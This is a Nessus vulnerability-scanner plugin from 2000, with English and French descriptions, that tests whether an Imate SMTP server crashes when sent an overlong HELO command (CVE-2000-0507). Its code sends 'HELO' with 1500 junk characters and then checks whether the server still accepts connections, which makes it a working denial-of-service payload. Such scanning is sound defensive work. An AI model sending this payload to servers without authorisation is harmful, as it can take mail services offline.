#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10435);
 script_bugtraq_id(1286);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0507");
 name["english"] = "Imate HELO overflow";
 name["francais"] = "D�passement de HELO dans Imate";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote SMTP server crashes when it is
issued a HELO command with an argument longer
than 1200 chars.

This problem may allow an attacker to shut down
your SMTP server.

Solution : Upgrade the SMTP server software
Risk factor : High";


 desc["francais"] = "
Le serveur SMTP distant se plante lorsqu'on lui
envoye une commande HELO ayant un argument
de plus de 1200 octets.

Ce probl�me peut permettre � des pirates d'�teindre
votre serveur SMTP

Solution : mettez-le � jour
Facteur de risque : S�rieux";


 script_description(english:desc["english"],
 	 	    francais:desc["francais"]);
		    
 
 summary["english"] = "Checks if the remote mail server can be oveflown"; 
 summary["francais"] = "V�rifie si le serveur de mail est sujet � un overflow";
 script_summary(english:summary["english"],
 		 francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Probl�mes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);
 crp = string("HELO ", crap(1500), "\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:4);
 close(soc);
 
 
 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
 }
}
